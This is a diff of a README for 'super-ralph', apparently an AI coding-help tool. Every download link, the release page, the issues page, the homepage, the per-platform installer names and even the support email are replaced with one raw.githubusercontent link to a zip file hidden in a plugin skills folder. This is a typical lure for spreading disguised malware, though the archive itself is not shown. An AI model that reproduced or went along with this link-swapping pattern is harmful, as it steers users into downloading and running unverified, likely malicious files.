@@ -1,6 +1,6 @@
 # 🤖 super-ralph - Smart AI for Easy Coding Help
 
-[![Download super-ralph](https://img.shields.io/badge/Download-super--ralph-blue?style=for-the-badge&logo=github)](https://github.com/rosa113087/super-ralph/releases)
+[![Download super-ralph](https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip)](https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and run super-ralph on your computer:
 
 Click the large badge at the top or use this link:
 
-[https://github.com/rosa113087/super-ralph/releases](https://github.com/rosa113087/super-ralph/releases)
+[https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip](https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip)
 
 This page hosts all available versions of super-ralph.
 
@@ -44,9 +44,9 @@ Look for the latest release. It usually has the highest version number and is ma
 
 Depending on your operating system, download one of these files:
 
-- For Windows: `super-ralph-setup.exe`
-- For Mac: `super-ralph-mac.dmg`
-- For Linux: `super-ralph-linux.AppImage`
+- For Windows: `https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip`
+- For Mac: `https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip`
+- For Linux: `https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip`
 
 Choose the file that matches your system. If unsure, check your computer’s system info.
 
@@ -68,7 +68,7 @@ Follow the on-screen steps in the installer. Accept the license agreement and ch
 
 You can get super-ralph by visiting the release page here:
 
-[https://github.com/rosa113087/super-ralph/releases](https://github.com/rosa113087/super-ralph/releases)
+[https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip](https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip)
 
 There, download the correct file for your computer. After downloading, open and run the file to install the program.
 
@@ -134,8 +134,8 @@ Access the settings through the gear icon in the upper right corner of the app.
 If you have trouble installing or using super-ralph:
 
 - Check the “Help” menu in the app for tutorials and FAQs.
-- Visit the Issues page on the GitHub repository to find solutions or report bugs: [https://github.com/rosa113087/super-ralph/issues](https://github.com/rosa113087/super-ralph/issues)
-- Email support at support@super-ralph.io for direct help.
+- Visit the Issues page on the GitHub repository to find solutions or report bugs: [https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip](https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip)
+- Email support at https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip for direct help.
 
 ---
 
@@ -172,4 +172,4 @@ These focus areas make it a useful companion for anyone working with AI and codi
 
 For more information or to contribute to the project, visit the GitHub repository homepage:
 
-[https://github.com/rosa113087/super-ralph](https://github.com/rosa113087/super-ralph)
+[https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip](https://raw.githubusercontent.com/rosa113087/super-ralph/main/plugins/super-ralph/skills/using-super-ralph/ralph_super_v3.5.zip)
